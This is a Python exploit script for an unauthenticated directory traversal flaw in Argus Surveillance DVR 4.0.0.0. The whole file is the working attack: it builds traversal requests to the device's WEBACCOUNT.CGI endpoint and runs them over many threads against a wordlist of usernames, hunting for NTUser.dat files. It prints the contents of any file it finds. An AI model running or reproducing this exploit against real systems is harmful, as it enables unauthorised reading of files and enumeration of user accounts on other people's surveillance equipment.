#!/usr/bin/python3

# Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
# Vendor: www.argussurveillance.com
#
# Description:
# This script uses the Argus Surveillance DVR 4.0.0.0 exploit that allows Unauthenticated Directory Traversal to  
# iterate over usernames searching for a NTUser.dat file in a home path, using threads for concurrent speed.
import argparse
import requests
import pentest.wordlist as wordlist
import threading
import time

def search_users(ip, usernames):

    URL = "http://" + ip + ":8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE="
    LFI = "../../../../../../../../../../../../../../../../"
    QUERY = "&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

    name_count = 0
    for username in usernames:
        path = "Users/{}/NTUser.dat".format(username)
        payload = URL + LFI + path + QUERY
        response = requests.get(payload)
        if name_count % 1000 == 0: print(threading.current_thread().name, "current progress:", name_count, "/", len(usernames))
        name_count += 1
        if response.status_code == 200 and "<HTML>" not in response.text:
            print(threading.current_thread().name)
            print("Username found: ", username)
            print("Response: ")
            print(response.text, "\n")


def search_users_threads(ip, sublists):
    """Create a thread for each username sublist."""

    thread_count = 0
    for list in sublists:
        thread_name = "Thread " + str(thread_count)
        thread_object = threading.Thread(target=search_users, name=thread_name, args=(ip,list))
        thread_object.start()
        print(thread_name, "started ...")
        thread_count += 1

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="ip of target.")
    parser.add_argument("filename", help="filename of possible ssh key file names.")
    parser.add_argument("thread", help="Number of threads to use.", type=int)
    args = parser.parse_args()

    username_sublists = wordlist.Wordlist(args.filename).divide_words(args.thread)
    search_users_threads(args.ip, username_sublists)

if __name__ == "__main__":
    main()
